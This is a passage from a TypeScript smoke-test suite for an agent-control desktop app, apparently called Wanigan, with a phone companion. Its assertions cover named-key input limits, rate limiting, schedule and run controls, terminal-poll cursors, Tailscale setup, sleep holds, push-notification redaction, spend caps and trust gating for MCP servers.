    'a paired device presses a key by name from a closed list, and the sequence that reaches the PTY is the one the main process chose — an unlisted name, a differently-cased one and an inherited Object.prototype name are all refused',
    `${advertisedKeys.length} advertised, pressed ${pressedKeys.join(',')}, refused ${refusedKeys.map((refused) => refused.status).join(',')}`);
    // The page carries no escape sequence at all, in any form: it posts the
    // name of a key and the bytes stay behind. And every button says the word
    // for what it sends, because a bare arrowhead is a guess about what a
    // control does and this one does something to a live agent. The last clause
    // is the promise this suite used to pin: nothing served to a phone may
    // claim a boundary between typing and approving that no code enforces.
    check(composedShell.split('id="terminal-keys"').length === 2
      && composedJs.includes("body:JSON.stringify({ action:'key', sessionId:sessionId, key:key.name })")
      && composedJs.includes("button.append(glyph, node('span', '', label));")
      && composedJs.includes("glyph.setAttribute('aria-hidden', 'true');")
      && !composedShell.includes('u001b') && !composedShell.includes('\x1b')
      && !/permission decisions stay at the Mac|decision stays at the Mac/.test(composedShell),
    'the phone page offers the keys a waiting agent needs, each labelled with the word for what it sends, carries no terminal escape sequence of its own, and no longer tells the operator that a decision it can in fact type stays at the Mac');
    // navigator.onLine === false is the one thing a browser will state outright
    // about the connection, and it is a different sentence from the Mac having
    // gone quiet. Every failed poll used to be reported as the Mac — 'the usual
    // reasons are that the Mac went to sleep' — which on a phone with no signal
    // is this page guessing about a machine it cannot see, in the one place
    // someone away from their desk has to trust it. So device-offline is its own
    // state beside connected, stale and never, and the two sentences may not be
    // confused: the offline branch must not reach for the Mac at all.
    const offlineAt = composedJs.indexOf("connectionState === 'offline'");
    const staleAt = composedJs.indexOf("connectionState === 'stale'");
    const offlineWords = offlineAt >= 0 && staleAt > offlineAt ? composedJs.slice(offlineAt, staleAt) : '';
    check(composedJs.includes('function deviceOffline() { return navigator.onLine === false; }')
      && composedJs.includes("if (deviceOffline()) setConnection('offline');")
      && composedJs.includes("state('bad', 'Offline · this device has no network')")
      && offlineWords.includes('This device has no network.')
      && !offlineWords.includes('the Mac went to sleep')
      && composedJs.includes("addEventListener('online', () => { pollDelay = POLL_FAST_MS; void poll(); });")
      && composedJs.includes("navigator.serviceWorker.register('sw.js', { scope: './' })"),
    'a phone with no network is told that its own radio is gone rather than that the Mac is probably asleep, in a fourth state beside the three about the Mac, and the page registers the worker that lets it say so with no network at all',
    offlineWords ? `${offlineWords.length} bytes of offline branch` : 'offline branch not found');
    /* ── the Manage hub · how the last fire actually ended ──────────────
     * A schedule that has never fired and one whose last fire succeeded are
     * different facts about this Mac, and the phone is the surface someone
     * checks precisely because they cannot see it. So the two are different
     * values on the wire rather than one field that can go absent — an absent
     * field, an empty string or a zero would let 'nothing has ever proved this
     * works' render as 'all clear'.
     */
    say('── phone fleet · the Manage hub');
    const freshSchedule = schedule.createSchedule({
      name: 'smoke phone never fired', cron: '0 3 * * *', kind: 'headless',
      payload: { prompt: 'audit', allProjects: true },
    });
    const firedSchedule = schedule.createSchedule({
      name: 'smoke phone last fire ok', cron: '0 4 * * *', kind: 'headless',
      payload: { prompt: 'audit', allProjects: true },
    });
    // Straight onto the schedule row, which is what a finished fire leaves
    // behind: recordFireOutcome writes last_status through touchSchedule, and
    // driving a whole fan-out here would prove less about the wire shape.
    db().prepare("UPDATE schedules SET last_at=?, last_status='ok', last_detail=?, runs=1 WHERE id=?")
      .run(Date.now() - 60_000, 'Handed off without error.', firedSchedule.id);
    type PhoneSchedule = { id: string; paused: boolean; nextAt: number | null; last: { outcome: string; at: number | null } };
    const phoneSchedules = await fetch(new URL('api/schedules', monitor.localUrl), { headers: { authorization: `Bearer ${token}` } });
    const phoneScheduleBody = await phoneSchedules.json() as { schedules?: PhoneSchedule[] };
    const listedSchedules = phoneScheduleBody.schedules ?? [];
    const neverFired = listedSchedules.find((row) => row.id === freshSchedule.id);
    const lastFireOk = listedSchedules.find((row) => row.id === firedSchedule.id);
    check(neverFired?.last.outcome === 'never' && neverFired.last.at === null
      && lastFireOk?.last.outcome === 'ok' && typeof lastFireOk.last.at === 'number',
    'a schedule that has never fired does not read as one whose last run succeeded: the phone is told "never" with no time attached, and a fire that finished is a different value carrying the time it ended',
    JSON.stringify({ neverFired: neverFired?.last, lastFireOk: lastFireOk?.last }));

    const unknownPause = await fetch(new URL('api/schedules', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'pause', id: 'sch_does_not_exist' }),
    });
    const unknownPauseBody = await unknownPause.json() as { error?: string };
    const phonePause = await fetch(new URL('api/schedules', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'pause', id: freshSchedule.id }),
    });
    const phonePauseBody = await phonePause.json() as { schedule?: PhoneSchedule };
    const pausedRow = schedule.listSchedules().find((row) => row.id === freshSchedule.id);
    const phoneResume = await fetch(new URL('api/schedules', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'resume', id: freshSchedule.id }),
    });
    const phoneResumeBody = await phoneResume.json() as { schedule?: PhoneSchedule };
    const resumedRow = schedule.listSchedules().find((row) => row.id === freshSchedule.id);
    check(unknownPause.status === 404
      && unknownPauseBody.error === 'That is not a schedule this device can pause.'
      && phonePause.status === 200 && phonePauseBody.schedule?.paused === true && phonePauseBody.schedule.nextAt === null
      && pausedRow?.enabled === false && pausedRow.nextAt === null
      && phoneResume.status === 200 && phoneResumeBody.schedule?.paused === false
      && resumedRow?.enabled === true && typeof resumedRow.nextAt === 'number',
    'a schedule id from a phone is checked against the real list in main before anything is written — an unknown one is refused outright — and a pause the Mac reports actually disarms the row, with a resume that arms it again rather than only saying so',
    `${unknownPause.status}:${unknownPauseBody.error} / pause ${phonePause.status} enabled=${pausedRow?.enabled} / resume ${phoneResume.status} enabled=${resumedRow?.enabled}`);
    schedule.deleteSchedule(freshSchedule.id);
    schedule.deleteSchedule(firedSchedule.id);
    /* ── the runs panel · stopping is not stopped, and silent is not free ──
     * cancelHeadless signals the agents and leaves the run 'canceling' while
     * they wind down — a repository whose agent is running closes itself out
     * through its own exit path. A phone that reported "stopped" the moment the
     * tap landed would be inventing the outcome it wanted, and the person
     * holding it would put it down over a run that is still spending. The same
     * mistake pointed the other way is the cost line: a repository whose CLI
     * named no cost and a repository that was free are the same stored 0, and
     * this is the surface someone would act on the difference from.
     */
    const stoppingRunId = 'run_smoke_phone_stopping';
    const silentRunId = 'run_smoke_phone_silent';
    const seedPhoneRun = db().prepare(
      `INSERT INTO runs (id,name,model,status,config_json,kind,created_at,submitted_at)
       VALUES (?,?,'smoke-phone-model',?,'{}','headless',?,?)`
    );
    const seedPhoneRow = db().prepare(
      `INSERT INTO headless_rows (run_id,project_id,project_name,project_path,status,cost_usd,cost_reported)
       VALUES (?,?,?,'/private/tmp/smoke-phone-repo',?,0,NULL)`
    );
    seedPhoneRun.run(stoppingRunId, 'smoke phone stopping fan-out', 'canceling', Date.now() - 90_000, Date.now() - 90_000);
    seedPhoneRow.run(stoppingRunId, 'p_smoke_stopping', 'smoke stopping repo', 'running');
    seedPhoneRun.run(silentRunId, 'smoke phone silent fan-out', 'in_progress', Date.now() - 80_000, Date.now() - 80_000);
    // One repository finished and named no cost, one is still running. Stored,
    // both of those are the same 0.
    seedPhoneRow.run(silentRunId, 'p_smoke_silent_done', 'smoke silent repo', 'succeeded');
    seedPhoneRow.run(silentRunId, 'p_smoke_silent_open', 'smoke open repo', 'running');
    type PhoneRunState = { id: string; status: string; open: number; live: boolean; cancelable: boolean;
      costUsd: number; costStatus: string; costFinal: boolean };
    const phoneRuns = await fetch(new URL('api/runs', monitor.localUrl), { headers: { authorization: `Bearer ${token}` } });
    const phoneRunsBody = await phoneRuns.json() as { runs?: PhoneRunState[] };
    const listedRuns = phoneRunsBody.runs ?? [];
    const stoppingRun = listedRuns.find((row) => row.id === stoppingRunId);
    const silentRun = listedRuns.find((row) => row.id === silentRunId);
    const unknownCancel = await fetch(new URL('api/runs', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'cancel', id: 'run_does_not_exist' }),
    });
    const unknownCancelBody = await unknownCancel.json() as { error?: string };
    const stoppingCancel = await fetch(new URL('api/runs', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'cancel', id: stoppingRunId }),
    });
    const stoppingCancelBody = await stoppingCancel.json() as { error?: string };
    const stoppingAfter = db().prepare('SELECT status FROM runs WHERE id=?')
      .get(stoppingRunId) as { status: string } | undefined;
    const stoppingRowAfter = db().prepare('SELECT status FROM headless_rows WHERE run_id=?')
      .get(stoppingRunId) as { status: string } | undefined;
    check(unknownCancel.status === 404
      && unknownCancelBody.error === 'That is not a run this device can cancel.'
      && stoppingRun?.status === 'canceling' && stoppingRun.live === true && stoppingRun.cancelable === false
      && stoppingCancel.status === 409
      && stoppingCancelBody.error === 'That run is already stopping. Wanigan has asked its agents to quit and is waiting for them to go.'
      && stoppingAfter?.status === 'canceling' && stoppingRowAfter?.status === 'running'
      && composedJs.includes('is still stopping: the agents have been asked to quit'),
    'a run id from a phone is checked against the real list in main before anything is signalled — an unknown one is refused outright — and a run already winding down is reported as stopping rather than stopped: it is offered no cancel button, a second cancel is refused with a sentence that says why, and the page carries the branch that reports "still stopping" from what the Mac answered',
    `${unknownCancel.status}:${unknownCancelBody.error} / stopping ${stoppingCancel.status}:${stoppingCancelBody.error} run=${stoppingAfter?.status} row=${stoppingRowAfter?.status}`);
    check(silentRun?.costStatus === 'unreported' && silentRun.costUsd === 0
      && silentRun.costFinal === false && silentRun.open === 1
      && composedJs.includes('That is not the same as this run having been free.')
      && composedJs.includes('That is not the same as nothing having been spent.'),
    'a fan-out whose finished repository named no cost reads as unreported rather than as free: the wire carries "unreported" beside the stored zero and says a repository is still open, and the page has both sentences that keep a silent CLI and a run still in flight from being printed as $0.00',
    JSON.stringify(silentRun));
    // The console polls /api/terminal every 1.5 seconds and /api/control on
    // every render. Charging those reads to the same 20-per-minute budget as a
    // launch would 429 a console that is working perfectly, within seconds of
    // opening it — so the limiter is deliberately POST-only.
    const pollCodes: number[] = [];
    for (let attempt = 0; attempt < 40; attempt++) {
      const polled = await fetch(new URL('api/terminal?session=s_mobile', monitor.localUrl), { headers: { authorization: `Bearer ${token}` } });
      pollCodes.push(polled.status);
      await polled.arrayBuffer();
    }
    check(pollCodes.every((status) => status === 200),
      'polling the console reads never spends the remote-action write budget, so an iPad left open does not rate-limit itself out of its own terminal',
      pollCodes.filter((status) => status !== 200).length);
    // Keys are writes, and they travel the one POST route every other remote
    // action travels, so they spend the same twenty-a-minute budget rather than
    // an allowance of their own. The proof is the action at the end: it is a
    // plain instruction, and if key presses had a private window it would still
    // be affordable. This is deliberately the LAST /api/action POST in this
    // block, because it leaves the shared window drained for the rest of the
    // minute — put a new remote-action assertion above it, never below.
    let keyPresses = 0;
    let firstRefusal = 0;
    while (keyPresses < 40 && firstRefusal === 0) {
      const burst = await fetch(new URL('api/action', monitor.localUrl), {
        method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
        body: JSON.stringify({ action: 'key', sessionId: 's_mobile', key: 'down' }),
      });
      keyPresses++;
      if (burst.status === 429) firstRefusal = keyPresses;
      await burst.arrayBuffer();
    }
    const afterBurst = await fetch(new URL('api/action', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'prompt', sessionId: 's_mobile', prompt: 'Continue' }),
    });
    const afterBurstBody = JSON.parse(await afterBurst.text()) as { error?: string };
    check(firstRefusal > 0 && afterBurst.status === 429
      && afterBurstBody.error === 'Too many remote actions. Wait a minute and try again.',
    'pressing a key spends the same remote-action budget as a launch or an instruction, so a phone cannot machine-gun keystrokes into a live agent and cannot buy itself a second allowance by calling them keys',
    `refused after ${firstRefusal} presses; the instruction that followed: ${afterBurst.status}`);
    // Deliberately BELOW the burst above, and the only assertion here that is.
    // A spent window is the one state in which a private allowance would show
    // itself: pausing a schedule changes what this Mac does while nobody is
    // watching it, so it has to draw on the same twenty-a-minute budget as a
    // launch, an instruction or a keystroke — refused in the dispatcher, before
    // the scheduler is touched at all.
    const budgetSchedule = schedule.createSchedule({
      name: 'smoke phone shared write budget', cron: '0 5 * * *', kind: 'headless',
      payload: { prompt: 'audit', allProjects: true },
    });
    const pauseAfterBurst = await fetch(new URL('api/schedules', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'pause', id: budgetSchedule.id }),
    });
    const pauseAfterBurstBody = await pauseAfterBurst.json() as { error?: string };
    const stillArmed = schedule.listSchedules().find((row) => row.id === budgetSchedule.id);
    check(pauseAfterBurst.status === 429
      && pauseAfterBurstBody.error === 'Too many remote actions. Wait a minute and try again.'
      && stillArmed?.enabled === true,
    'pausing a schedule spends the same remote-action budget as a launch or a keystroke: with that window already drained the pause is refused with the shared sentence and the schedule is still armed, so a phone cannot buy itself a second allowance by calling a write a schedule change',
    `${pauseAfterBurst.status}:${pauseAfterBurstBody.error} enabled=${stillArmed?.enabled}`);
    schedule.deleteSchedule(budgetSchedule.id);
    // Deliberately BELOW the key burst above, beside the schedule pause and for
    // the same reason. Cancelling ends work the operator paid for, so it has to
    // draw on the same twenty-a-minute budget as a launch, an instruction or a
    // keystroke — refused in the dispatcher, before ../headless is reached at
    // all. This depends on the window the burst drained, so it stays here.
    const cancelAfterBurst = await fetch(new URL('api/runs', monitor.localUrl), {
      method: 'POST', headers: { authorization: `Bearer ${token}`, 'content-type': 'application/json' },
      body: JSON.stringify({ action: 'cancel', id: silentRunId }),
    });
    const cancelAfterBurstBody = await cancelAfterBurst.json() as { error?: string };
    const silentStillOpen = db().prepare(
      "SELECT COUNT(*) n FROM headless_rows WHERE run_id=? AND status='running'"
    ).get(silentRunId) as { n: number };
    check(cancelAfterBurst.status === 429
      && cancelAfterBurstBody.error === 'Too many remote actions. Wait a minute and try again.'
      && silentStillOpen.n === 1,
    'cancelling a run spends the same remote-action budget as a launch or a keystroke: with that window already drained the cancel is refused with the shared sentence and the repository is still running, so a phone cannot buy itself a second allowance by calling a write a cancellation',
    `${cancelAfterBurst.status}:${cancelAfterBurstBody.error} open=${silentStillOpen.n}`);
    db().prepare('DELETE FROM runs WHERE id IN (?,?)').run(stoppingRunId, silentRunId);

    const rotated = await mobile.regenerateMobileToken();
    const oldToken = await fetch(apiUrl, { headers: { authorization: `Bearer ${token}` } });
    const newToken = new URLSearchParams(new URL(rotated.pairingUrl).hash.slice(1)).get('token') ?? '';
    const newAccepted = await fetch(apiUrl, { headers: { authorization: `Bearer ${newToken}` } });
    check(oldToken.status === 401 && newAccepted.ok,
      'rotating the pairing link revokes old phones immediately');

    /* ── the terminal poll reads a cursor, not the whole screen ───────
     * The console asks every 1.5 seconds and used to be answered with the
     * entire readable scrollback each time. What makes a cursor safe here is
     * not that it is smaller. sessions.ts keeps a 512KB *ring* and the rendered
     * screen is not append-only either, so a cursor that was only a position
     * would go on looking valid after a wrap or a redraw and hand the page an
     * append that silently skipped the middle. These pin the three answers the
     * route owes: only what is new, an explicit 'you fell behind, here is a
     * fresh screen', and a ceiling no single response crosses. */
    say('── phone fleet · the terminal poll reads a cursor, not the whole screen');
    let terminalScrollback = '';
    mobile.configureMobileControlSource({
      projects: async () => [],
      providers: async () => [],
      launch: async () => ({ id: 's_cursor', title: 'Cursor' }),
      prompt: async () => { /* not exercised here */ },
      interrupt: async () => true,
      terminal: async () => ({ title: 'Cursor', running: true, text: terminalScrollback }),
    });
    type TerminalRead = { mode?: string; text?: string; tail?: string; cursor?: string; screenReason?: string | null; truncated?: boolean };
    const readTerminal = async (cursor?: string): Promise<TerminalRead> => {
      const at = new URL('api/terminal?session=s_cursor', monitor.localUrl);
      if (cursor) at.searchParams.set('cursor', cursor);
      const response = await fetch(at, { headers: { authorization: `Bearer ${newToken}` } });
      return JSON.parse(await response.text()) as TerminalRead;
    };

    terminalScrollback = Array.from({ length: 400 }, (_, index) => `settled line ${index}`).join('\n');
    const wholeScreen = await readTerminal();
    terminalScrollback += '\nfresh line A\nfresh line B';
    const delta = await readTerminal(wholeScreen.cursor);
    // Exactly what the page does: strip the live tail off the screen it was
    // given, append the delta, put the new tail back. If that does not rebuild
    // the scrollback character for character, the console is showing a lie.
    const rebuilt = (wholeScreen.text ?? '').slice(0, (wholeScreen.text ?? '').length - (wholeScreen.tail ?? '').length)
      + (delta.text ?? '') + (delta.tail ?? '');
    check(wholeScreen.mode === 'screen' && delta.mode === 'append'
      && rebuilt === terminalScrollback
      && (delta.text ?? '').length + (delta.tail ?? '').length < 4_000,
    'a second terminal read returns only what is new, and the page rebuilds the exact screen from it — two new lines cost a few hundred bytes, not the whole scrollback again',
    `${delta.mode} ${(delta.text ?? '').length + (delta.tail ?? '').length}B rebuilt=${rebuilt === terminalScrollback}`);

    // The ring wrapped: sessions.ts dropped the front of the buffer, so the
    // lines this cursor counted are not the lines Wanigan still holds.
    terminalScrollback = terminalScrollback.split('\n').slice(200).join('\n');
    const wrapped = await readTerminal(delta.cursor);
    check(wrapped.mode === 'screen' && wrapped.screenReason === 'behind' && wrapped.text === terminalScrollback,
      'a client that fell behind the scrollback ring is told so and handed a fresh screen, never an append stitched across the gap',
      `${wrapped.mode}/${wrapped.screenReason} whole=${wrapped.text === terminalScrollback}`);

    // Same failure by the other route: the line count still fits, but a redraw
    // above the live tail means those are no longer the same lines. A cursor
    // that was only a position could not tell these two states apart.
    terminalScrollback = terminalScrollback.split('\n').map((line, index) => (index === 3 ? 'REDRAWN' : line)).join('\n');
    const redrawn = await readTerminal(wrapped.cursor);
    check(redrawn.mode === 'screen' && redrawn.screenReason === 'behind',
      'a line rewritten above the live tail invalidates the cursor as well, so a redrawing agent TUI is repainted rather than appended to incorrectly',
      `${redrawn.mode}/${redrawn.screenReason}`);

    // MAX_TERMINAL_BYTES. A session that printed more than one response can
    // carry gets a bounded screen that says it is bounded — not a short append
    // presented as if it were complete.
    const TERMINAL_CEILING = 240 * 1024;
    terminalScrollback += `\n${Array.from({ length: 20_000 }, (_, index) => `flood ${index} ${'y'.repeat(40)}`).join('\n')}`;
    const flooded = await readTerminal(redrawn.cursor);
    const cold = await readTerminal();
    check(flooded.mode === 'screen' && flooded.screenReason === 'too-much-output' && flooded.truncated === true
      && Buffer.byteLength(flooded.text ?? '') <= TERMINAL_CEILING
      && Buffer.byteLength(cold.text ?? '') <= TERMINAL_CEILING,
    'no single terminal response crosses the byte ceiling, and one that had to drop output reports the drop instead of appending over it',
    `${flooded.mode}/${flooded.screenReason}/truncated=${flooded.truncated} ${Buffer.byteLength(flooded.text ?? '')} and ${Buffer.byteLength(cold.text ?? '')} of ${TERMINAL_CEILING}`);

    const junkCursor = await readTerminal('not-a-cursor');
    check(junkCursor.mode === 'screen' && junkCursor.screenReason === 'first-read',
      'a malformed cursor from the browser reads as no cursor at all: a fresh screen, not an error and not a guess at what it meant',
      `${junkCursor.mode}/${junkCursor.screenReason}`);
  } finally {
    setSetting('mobile_dashboard_enabled', '0');
    setSetting('mobile_remote_control_enabled', '0');
    mobile.stopMobileMonitor();
    mobile.configureSnapshotSource(null);
    mobile.configureMobileControlSource(null);
  }

  /* ── the transport Wanigan drives itself ──────────────────────────
   * Setting the phone up used to mean reading a CLI command out of a settings
   * panel, running it, and pasting a URL back. These pin the parts of driving
   * Tailscale that are pure: the argv (never a shell string — a MagicDNS name
   * and a port both reach it), and the five states, which exist because
   * "not installed", "signed out" and "installed and ready" need three
   * different sentences and collapsing any two puts a wrong instruction on
   * screen. The probes themselves are not asserted: tailscale may not be
   * installed on the machine running this suite, and a test that passes only
   * where the binary happens to exist is worse than none. */
  say('── phone fleet · the tailnet transport');
  const tsPort = 47_899;
  check(Array.isArray(tailnet.__test.serveArgv(tsPort))
    && tailnet.__test.serveArgv(tsPort).includes(String(tsPort))
    && tailnet.__test.serveArgv(tsPort).every((part: unknown) => typeof part === 'string'),
    'the serve command is an argv array carrying the validated port, never a shell string a hostname could break out of');
  const loggedOut = tailnet.__test.readBackend(tsPort, { ok: true, text: JSON.stringify({ BackendState: 'NeedsLogin' }) });
  const stopped = tailnet.__test.readBackend(tsPort, { ok: true, text: JSON.stringify({ BackendState: 'Stopped' }) });
  check(loggedOut.kind === 'status' && loggedOut.status.state === 'logged-out'
    && stopped.kind === 'status' && stopped.status.state === 'logged-out',
    'a Tailscale that is installed but signed out reads as logged-out, so the panel offers a sign-in rather than a button that would fail',
    `${loggedOut.kind === 'status' ? loggedOut.status.state : loggedOut.kind}`);
  const garbled = tailnet.__test.readBackend(tsPort, { ok: true, text: 'not json at all' });
  check(garbled.kind === 'status' && garbled.status.state === 'error',
    'an unreadable status reply is an error carrying the text, never a cheerful "not installed"');
  check(tailnet.__test.serveUrl('mac.tail1234.ts.net:443', '/') === 'https://mac.tail1234.ts.net/'
    && tailnet.__test.serveUrl('mac.tail1234.ts.net:8443', '/') === 'https://mac.tail1234.ts.net:8443/'
    && tailnet.__test.serveUrl('nonsense', '/') === null,
    'a serve mapping becomes an https URL, and a mapping it cannot parse becomes null rather than a guessed address');

  /* Keeping the Mac awake is a state machine, and only the state machine is
   * asserted here. Whether macOS actually stayed up is not observable from
   * this process, and a check that cannot fail is worse than none. What can
   * fail is the bookkeeping: a hold taken when nothing is running, a second
   * blocker stacked on the first — which is a laptop that never sleeps again
   * with no id left in this process to release it — or a release that reports
   * itself while an id is still outstanding. */
  say('── keeping the Mac awake · the hold and its release');
  const awake = await import('./awake');
  const awakeIdle = awake.reconcileAwake({ sessions: 0, dashboard: false });
  check(awakeIdle.held === false && awakeIdle.reason === null && awakeIdle.since === null,
    'an open Wanigan with nothing running holds nothing: the condition is a live agent or the dashboard, never the app being launched',
    awakeIdle);
  const holding = awake.reconcileAwake({ sessions: 2, dashboard: false });
  const firstBlockerId = awake.__test.blockerId();
  check(holding.held === true && holding.reason === 'sessions' && holding.sessions === 2
    && typeof holding.since === 'number' && holding.error === null,
    'two live agents take the blocker, and the state names the reason and the count rather than answering with a bare boolean',
    holding);
  const again = awake.reconcileAwake({ sessions: 3, dashboard: false });
  check(again.held === true && again.sessions === 3 && awake.__test.blockerId() === firstBlockerId,
    'reconciling again while already holding keeps the same blocker id — powerSaveBlocker.start() hands out a new one on every call, and a leaked id is a Mac that never sleeps again',
    { firstBlockerId, now: awake.__test.blockerId() });
  const awakeBoth = awake.reconcileAwake({ sessions: 1, dashboard: true });
  check(awakeBoth.reason === 'both' && awake.__test.blockerId() === firstBlockerId,
    'an agent and the dashboard together read as both, because either one going away still leaves a reason to hold',
    awakeBoth.reason);
  const dashboardOnly = awake.reconcileAwake({ sessions: 0, dashboard: true });
  check(dashboardOnly.held === true && dashboardOnly.reason === 'dashboard' && dashboardOnly.sessions === 0,
    'the phone dashboard holds the Mac on its own: a device polling a suspended laptop gets nothing',
    dashboardOnly);
  const released = awake.reconcileAwake(null);
  check(released.held === false && released.reason === null && released.since === null
    && released.sessions === 0 && awake.__test.blockerId() === null,
    'releasing gives the id back and reports no hold, no reason and no since — the quit path is this call and nothing else',
    released);
  check(typeof released.onBattery === 'boolean',
    'the power source travels with the state, because a blocker cannot stop a closed lid on battery from suspending',
    released.onBattery);

  say('── phone fleet · bounded outbound alert');
  const originalFetch = globalThis.fetch;
  const pushCapture: { published: Record<string, unknown> | null; count: number } = {
    published: null,
    count: 0,
  };
  let pushStatus = 200;
  globalThis.fetch = (async (_input: string | URL | Request, init?: RequestInit) => {
    pushCapture.count++;
    pushCapture.published = JSON.parse(String(init?.body ?? '{}')) as Record<string, unknown>;
    return new Response('{"id":"smoke"}', { status: pushStatus, headers: { 'content-type': 'application/json' } });
  }) as typeof fetch;
  try {
    await mobile.setMobileConfig({ pushEnabled: true, pushServer: 'https://example.com' });
    const privateAttention = {
      sessionId: quiet.id,
      kind: 'permission' as const,
      transitionId: 'event:phone-push-smoke',
      since: Date.now() - 65_000,
      label: 'Asking',
      detail: `Bash · cat /private/${privateMarker}`,
      tool: 'Bash',
    };
    const safeBody = notify.mobileAttentionBody(privateAttention);
    const delivered = await mobile.sendMobilePush({
      title: 'Asking — smoke', body: safeBody, urgent: true,
    });
    check(delivered.ok && pushCapture.published?.priority === 5,
      'permission waits map to a maximum-priority ntfy publication');
    check(pushCapture.published?.message === 'Waiting for approval for 1m.',
      'the outbound body carries state and wait time rather than hook detail', pushCapture.published?.message);
    check(!JSON.stringify(pushCapture.published).includes(privateMarker)
      && !JSON.stringify(pushCapture.published).includes('cat '),
    'commands, hook summaries and local paths do not enter the ntfy payload', pushCapture.published);
    check(!Object.hasOwn(pushCapture.published ?? {}, 'click'),
      'ntfy does not receive the private dashboard or tailnet URL', pushCapture.published);

    pushCapture.count = 0;
    const transition = {
      ...privateAttention,
      sessionId: 's_smoke_distinct_attention',
      transitionId: 'event:attention-one',
    };
    notify.announceAttention(transition);
    notify.announceAttention(transition);
    notify.announceAttention({
      ...transition,
      transitionId: 'event:attention-two',
      since: transition.since + 1,
    });
    await new Promise<void>((resolve) => setImmediate(resolve));
    check(pushCapture.count === 2,
      'one transition is deduplicated exactly while a second prompt in the same session still alerts',
      pushCapture.count);

    pushStatus = 403;
    const rejected = await mobile.sendMobilePush({
      title: 'Rejected configuration', body: 'This should not loop.', urgent: false,
    });
    check(!rejected.ok && !rejected.retryable && rejected.httpStatus === 403,
      'a permanent ntfy rejection is surfaced but not put on the automatic retry loop');
  } finally {
    globalThis.fetch = originalFetch;
    await mobile.setMobileConfig({ pushEnabled: false, pushServer: 'https://ntfy.sh' });
  }

  /* ── phase 24 · the money gate holds on every path ─────────────────── */
  // A missing estimate used to read as $0, so `projected > cap` could never fire
  // for a caller that had not priced its own run — which is every caller the
  // queue dispatches, including a schedule firing at 03:00 with nobody there.
  say('── phase 24 · spend cap');
  const capCfg = baseCfg({
    name: 'smoke unpriced run',
    maxTokens: 4096,
    source: { kind: 'jsonl', text: Array.from({ length: 5 }, (_, i) => `{"text":"row ${i}"}`).join('\n') },
  });
  const capWas = getSetting('spend_cap_usd', '1.00');
  try {
    setSetting('spend_cap_usd', '0.0001');
    const runsBefore = batch.listRuns().length;
    let refusal = '';
    try { await batch.createAndSubmitRun(capCfg); }
    catch (e) { refusal = e instanceof Error ? e.message : String(e); }
    check(/exceeds/.test(refusal) && /spend cap/.test(refusal),
      'a run nobody priced is priced here and refused against the cap', refusal);
    check(/priced here/i.test(refusal),
      'the refusal says the price was worked out at submit time rather than taken on trust');
    check(batch.listRuns().length === runsBefore,
      'and nothing was written — a refused run leaves no row behind');

    setSetting('spend_cap_usd', '5.00');
    const priced = await batch.createAndSubmitRun(capCfg);
    const pd = batch.runDetail(priced.runId);
    check(pd.run.est_cost_usd > 0,
      'a run that fits records the number the cap was actually checked against', pd.run.est_cost_usd);
    check((pd.events as { message: string }[]).some((e) => /priced here/i.test(e.message)),
      'and logs it, so a run priced by a queue is not a figure nobody can find afterwards');

    // What the registered 'batch' queue runner does when a schedule fires: read
    // the run's config back and submit it again. Re-reading is the point — edit
    // the run and what fires changes, and a glob source re-reads the world
    // rather than replaying a frozen copy of the dataset.
    const cfgBack = pd.config as RunConfig;
    const again = await batch.createAndSubmitRun(
      { ...cfgBack, name: `${cfgBack.name} — scheduled` }, { parentRunId: priced.runId }
    );
    check(batch.runDetail(again.runId).run.parent_run_id === priced.runId,
      'a scheduled re-submission names the run it came from, so the lineage is visible');
    check(again.requests === priced.requests,
      'and the re-read config builds the same dataset', `${again.requests} vs ${priced.requests}`);
  } finally {
    setSetting('spend_cap_usd', capWas);
  }

  /* ── phase 12 · MCP registry ───────────────────────────────────────── */
  say('── phase 12 · MCP registry');
  // An enabled stdio server is a command the agent's CLI runs at every launch in
  // this scope, so it is now approved the way a provider pack is: read the exact
  // command, trust that digest, then enable. Registering it stays free; it is
  // enablement that carries the grant, which is why the refusal is asserted here
  // rather than assumed.
  const srv = mcpRegistry.upsertServer({
    projectId: null, name: 'smoke-fs', transport: 'stdio',
    command: 'echo', args: 'hello', enabled: false,
  });
  check(mcpRegistry.listServers(null).some((x) => x.id === srv.id), 'an MCP server is stored');

  let untrustedEnable = '';
  try { mcpRegistry.setServerEnabled(srv.id, true); }
  catch (error) { untrustedEnable = error instanceof Error ? error.message : String(error); }
  check(/trust this exact command/i.test(untrustedEnable),
    'enabling an untrusted stdio MCP server is refused, because enablement is a standing grant to run that command',
    untrustedEnable);

  const mcpReview = mcpRegistry.reviewServers(null).find((x) => x.id === srv.id);
  check(Boolean(mcpReview?.sha256), 'the review names the exact digest a person would be approving');

  // The gate above is only honest if there is somewhere to do the approving.
  // trustServer had no caller outside this file: Settings could refuse an
  // enable and nothing in the shipped app could record an approval, so every
  // stdio MCP server ever added was permanently unusable and the review panel
  // described a step that did not exist. Presence is asserted the way the
  // provider-pack pair is, and the negative forbids the old renderer-side
  // enable, which round-tripped the whole row through upsert.
  const mcpMainSrc = sourceOf('src/main/index.ts');
  const mcpPreloadSrc = sourceOf('src/preload/index.ts');
  const mcpSettingsSrc = sourceOf('src/renderer/src/views/Settings.tsx');
  check(mcpMainSrc.includes("handle('mcp:trust', async (id: unknown, sha256: unknown) => {")
    && mcpMainSrc.includes('...mcpTrustPrompt(review),')
    && mcpMainSrc.includes("if (answer.response !== 1) throw new Error('Cancelled. Nothing was trusted and nothing was enabled.');")
    && mcpMainSrc.includes("handle('mcp:review'")
    && mcpMainSrc.includes("handle('mcp:setEnabled'")
    && mcpMainSrc.includes("handle('mcp:revokeTrust'")
